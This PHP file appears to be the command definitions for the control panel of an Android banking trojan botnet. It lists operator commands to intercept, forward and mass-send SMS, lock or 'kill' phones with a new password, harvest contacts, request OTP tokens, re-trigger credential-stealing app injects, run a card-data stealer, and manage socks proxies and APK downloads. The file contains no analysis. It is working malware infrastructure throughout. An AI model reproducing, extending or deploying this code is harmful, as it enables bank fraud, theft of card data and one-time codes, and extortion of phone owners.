<?php
if(!defined('MODE')) hlp::show_404();

class Commands
{
	public $cmd_panel = array(
		'delete_bot' => array(
			'name' => 'Delete bots', 
			'descr' => 'Are you surely want to remove bots and their data from panel?<br />Live bots will return back to the panel, but data can not be restored.'
			),
			
		'delete_sms' => array(
			'name' => 'Delete SMS', 
			'descr' => 'Are you surely want to remove SMS?'
			),
			
		'delete_cards' => array(
			'name' => 'Delete cards', 
			'descr' => 'Are you surely want to remove cards?'
			),
			
		'delete_banks' => array(
			'name' => 'Delete banks', 
			'descr' => 'Are you surely want to remove banks?'
			),
			
		'cancel_task' => array(
			'name' => 'Cancel tasks', 
			'descr' => 'Are you surely want to cancel tasks?'
			),
			
		'repeat_task' => array(
			'name' => 'Repeat tasks', 
			'descr' => 'Are you surely want to repeat tasks?'
			),
			
		'delete_task' => array(
			'name' => 'Delete tasks', 
			'descr' => 'Are you surely want to delete tasks?'
			),
			
		'delete_contacts' => array(
			'name' => 'Delete Contacts', 
			'descr' => 'Are you surely want to remove contacts?'
			),
			
		'stop_socks' => array(
			'name' => 'Stop socks', 
			'descr' => 'Are you surely want to stop socks?'
			),
			
		'export_table' => array(
			'name' => 'Export table data to file', 
			'descr' => ''
			),
			
		'download_apk' => array(
			'name' => 'Download APK file', 
			'descr' => ''
			),
			
		'add_account' => array(
			'name' => 'Add new account', 
			'descr' => 'New account will be added'
			),
			
		'enable_account' => array(
			'name' => 'Enable account', 
			'descr' => ''
			),
			
		'disable_account' => array(
			'name' => 'Disable account', 
			'descr' => ''
			),
			
		'delete_account' => array(
			'name' => 'Delete account', 
			'descr' => ''
			),
			
		'jabber_save' => array(
			'name' => 'Save jabber configuration', 
			'descr' => ''
			),
			
		'jabber_test' => array(
			'name' => 'Test jabber configuration', 
			'descr' => ''
			),
			
		'disable_inject' => array(
			'name' => 'Block inject on all bots', 
			'descr' => ''
			),
			
		'enable_inject' => array(
			'name' => 'Enable inject on all bots', 
			'descr' => ''
			),
			
		'save_comment' => array(
			'name' => 'Set text comment on the bot', 
			'descr' => ''
			),
			
		'panel_get_bot_details' => array(
			'name' => 'Show short bot details in pop-up', 
			'descr' => ''
			),
			
		'panel_stats' => array(
			'name' => 'Reset/restore guest statistics', 
			'descr' => ''
			),
	);
	
	public static $cmd = array(
	
		'notification' => array(
			'bot_cmd' => 'notification',  // module name, lowercase, no spaces
			'name' => 'Show notification', 
			'descr' => 'Show notification in top notifies area. Click on notification will launch specified app',
			'fields' => array(
				// field id, field name, help, placeholder, required (bool)
				array('t', 'Title', '', 'Whatsapp', true),
				array('m', 'Message', 'Optimal length is nearly 20 characters', 'Verify your account', true),
				array('p', 'Package', 'Package name that will be launched after click on a notification', 'com.whatsapp'),
				),
			),
			
		'ussd' => array(
			'bot_cmd' => 'ussd', 
			'name' => 'USSD', 
			'descr' => 'Execute USSD code',
			'fields' => array(
					array('n', 'USSD code', '', '*100#', true),
				),
			),
			
		'send_sms' => array(
			'bot_cmd' => 'sms',  
			'name' => 'Send SMS', 
			'descr' => 'Send single SMS from the bot to specified phone number',
			'fields' => array(
				// field id, field name, help, placeholder, required (bool)
				array('n', 'Phone number', 'Country code required', '35542223570', true),
				array('m', 'Text', '', 'Hello!', true),
				),
			),
			
		'mass_sms' => array(
			'bot_cmd' => 'sms_to_contacts', 
			'name' => 'Mass SMS', 
			'descr' => 'Send SMS to all contacts of the bot',
			'fields' => array(
				// field id, field name, help, placeholder, required (bool)
				array('m', 'Text', '', 'Hello!', true),
				array('d', 'Delay', 'Delay between SMS in seconds', '10 seconds by default'),
				),
			),
			
		'mass_sms_plus' => array(
			'bot_cmd' => 'sms_to_list',
			'name' => 'Mass SMS+', 
			'descr' => 'Send SMS by list of URLs specified in Settings; One URL &#151; one bot',
			'fields' => array(
				// field id, field name, help, placeholder, required (bool)
				array('m', 'Text', '', 'Hello!', true),
				array('d', 'Delay', 'Delay between SMS in seconds', '10 seconds by default'),
				array('l', 'Limit', 'Send N SMS maximum from each bot', 'Leave empty to skip limit'),
				),
			),

		'screen_lock_on' => array(
			'bot_cmd' => 'screen_lock_on',
			'name' => 'Screen locker', 
			'descr' => 'Lock phone screen with a specified webpage',
			'fields' => array(
				// field id, field name, help, placeholder, required (bool)
				array('u', 'URL', '', 'http://gayporn.gov', true),
				),
			),
			
		'screen_lock_off' => array(
			'bot_cmd' => 'screen_lock_off',
			'name' => 'Screen locker', 
			'descr' => 'Disable screen locker',
			'fields' => array(
				),
			),

		'intercept_on' => array(
			'bot_cmd' => 'intercept_on',
			'name' => 'SMS Intercept', 
			'descr' => 'Send all incoming SMS to panel.<br />Delete them on phones older than Android 4.4.<br />For newest Android versions we recommend <a href="index.php#page:menu-extras" target="_blank">SMS deleter feature</a>',
			'fields' => array(
				),
			),
			
		'intercept_off' => array(
			'bot_cmd' => 'intercept_off',
			'name' => 'SMS Intercept', 
			'descr' => 'Disable SMS Intercept',
			'fields' => array(
				),
			),
			
		'kill_on' => array(
			'bot_cmd' => 'kill_on',
			'name' => 'Kill device', 
			'descr' => 'Disable screen permanently, mute sound, change password',
			'fields' => array(
					array('p', 'Password', '4 characters minimum.', 'Default value: 9990'),
				),
			),
			
		'kill_off' => array(
			'bot_cmd' => 'kill_off',
			'name' => 'Kill device', 
			'descr' => 'Unfreeze screen and remove password',
			'fields' => array(
				),
			),
			
		'update_info' => array(
			'bot_cmd' => 'update_info',
			'name' => 'Update bot info', 
			'descr' => 'Update full bot information (language, operator, list of apps etc)',
			'fields' => array(
				),
			),
			
		//~ 'admin_phone' => array(
			//~ 'bot_cmd' => 'admin_phone',
			//~ 'name' => 'Set admin phone', 
			//~ 'descr' => 'Set admin phone to control bot by sms',
			//~ 'fields' => array(
					//~ array('n', 'Phone number', 'Country code required', '35542223570', true),
				//~ ),
			//~ ),

		//~ 'api_server' => array(
			//~ 'bot_cmd' => 'api_server',
			//~ 'name' => 'API server', 
			//~ 'descr' => 'Change API servers list<br />Note: wrong format can make your bots inaccessible',
			//~ 'fields' => array(
					//~ array('u', 'URLs', 'FOLDER is your folder name, ask support', 'https://server1/FOLDER			
//~ https://server3/FOLDER			
//~ https://server3/FOLDER			', true, 'textarea'),
				//~ ),
			//~ ),

		'sms_redirect' => array(
			'bot_cmd' => 'sms_redirect',
			'name' => 'SMS Forwarding', 
			'descr' => 'Forward incoming SMS to the specified phone number',
			'fields' => array(
					array('n', 'Phone number', 'Country code required', '35542223570', true),
					array('d', 'Time', 'SMS will be forwarded this time (in minutes)', '60 minutes by default'),
				),
			),

		'repeat_inject' => array(
			'bot_cmd' => 'repeat_inject',
			'name' => 'Re-enable inject', 
			'descr' => 'Active inject that was already used by phone holder',
			'fields' => array(
					array('p', 'Package name', '', 'com.whatsapp', true),
				),
			),
//~ 
		//~ 'unblock_inject' => array(
			//~ 'bot_cmd' => 'unblock_inject',
			//~ 'name' => 'Unblock inject', 
			//~ 'descr' => 'Start showing inject for specified app',
			//~ 'fields' => array(
					//~ array('p', 'Package name', '', 'com.whatsapp', true),
				//~ ),
			//~ ),
//~ 
		//~ 'block_inject' => array(
			//~ 'bot_cmd' => 'block_inject',
			//~ 'name' => 'Block inject', 
			//~ 'descr' => 'Stop showing inject for specified app',
			//~ 'fields' => array(
					//~ array('p', 'Package name', '', 'com.whatsapp', true),
				//~ ),
			//~ ),

		'get_contacts' => array(
			'bot_cmd' => 'get_contacts',
			'name' => 'Get contacts', 
			'descr' => 'Get contacts from an address book of the phone',
			'fields' => array(
				),
			),

		'request_token' => array(
			'bot_cmd' => 'request_token', // Need a special code probably
			'name' => 'Request token', 
			'descr' => 'Ask OTP token from a phone folder',
			'fields' => array(
					array('p', 'Package name', '', 'com.whatsapp', true),
				),
			),

		'request_coordinates' => array(
			'bot_cmd' => 'request_coordinates', 
			'name' => 'Request coordinates', 
			'descr' => 'Ask OTP token from a phone folder',
			'fields' => array(
					array('p', 'Package name', '', 'com.whatsapp', true),
					array('x', 'X', '', '', true),
					array('y', 'Y', '', '', true),
					array('z', 'Z', '', '', true), // TODO coordinates params
				),
			),

		'fire_cc' => array(
			'bot_cmd' => 'fire_cc',
			'name' => 'Run CC stealer', 
			'descr' => 'Force to show CC stealer on the bot',
			'fields' => array(
				),
			),
			
	);
	
	function get_js($light_mode)
	{
		if($light_mode)
		{
			$cmd = array();
			foreach(Commands::$cmd as $key=>$val)
				if(!in_array($key, array('ussd', 'sms_redirect', 'kill_off', 'kill_on', 
				'screen_lock_off', 'screen_lock_on', 'mass_sms_plus', 'mass_sms'))) // commands blocked in Light version
					$cmd[$key] = $val;

			$v1 = json_encode($cmd);
		}else
			$v1 = json_encode(Commands::$cmd);
			
		$v2 = json_encode($this->cmd_panel);
		
		return <<<PHP
commands_data = {$v1};\n
panel_commands_data = {$v2};\n
PHP;
	}
	
}

